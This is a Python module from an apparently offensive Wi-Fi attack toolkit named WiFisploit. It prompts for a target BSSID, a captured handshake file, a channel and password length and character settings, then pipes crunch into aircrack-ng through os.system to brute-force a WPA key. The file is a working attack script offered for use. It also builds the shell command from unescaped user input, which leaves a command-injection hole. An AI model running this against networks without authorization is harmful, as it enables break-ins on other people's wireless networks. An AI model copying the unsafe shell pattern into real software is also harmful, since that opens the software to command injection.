# WiFisploit\wsf\modules\attacks\brute_force.py

import os
from pystyle import Colors, Colorate

gradient_colors = Colors.red_to_white

bssid = input(Colorate.Horizontal(gradient_colors, "wsf (BSSID) > ")).strip()
if bssid.lower() == "back":
	quit()
else:
	print(Colorate.Horizontal(gradient_colors, f"BSSID => {bssid}"))

handshake = input(Colorate.Horizontal(gradient_colors, "wsf (Handshake) > ")).strip()
if handshake.lower() == "back":
	quit()
else:
	print(Colorate.Horizontal(gradient_colors, f"Handshake => {handshake}"))

channel = input(Colorate.Horizontal(gradient_colors, "wsf (Channel) > ")).strip()
if channel.lower() == "back":
    quit()
try:
    channel = int(channel)
except ValueError:
    print(Colorate.Horizontal(gradient_colors, "Invalid channel. Must be a number."))
    quit()
print(Colorate.Horizontal(gradient_colors, f"Channel => {channel}"))

min = int(input(Colorate.Horizontal(gradient_colors, "wsf (Minimum) > ")))
if min == "back":
	quit()
else:
	print(Colorate.Horizontal(gradient_colors, f"Minimum => {min}"))

max = int(input(Colorate.Horizontal(gradient_colors, "wsf (Maximum) > ")))
if max == "back":
	quit()
else:
	print(Colorate.Horizontal(gradient_colors, f"Maximum => {max}"))

type = input(Colorate.Horizontal(gradient_colors, "wsf (Type) > ")).strip()
if type.lower() == "back":
	quit()
else:
	print(Colorate.Horizontal(gradient_colors, f"Type => {type}"))

os.system(f"crunch {min} {max} {type} | aircrack-ng -b {bssid} -c {channel} {handshake}")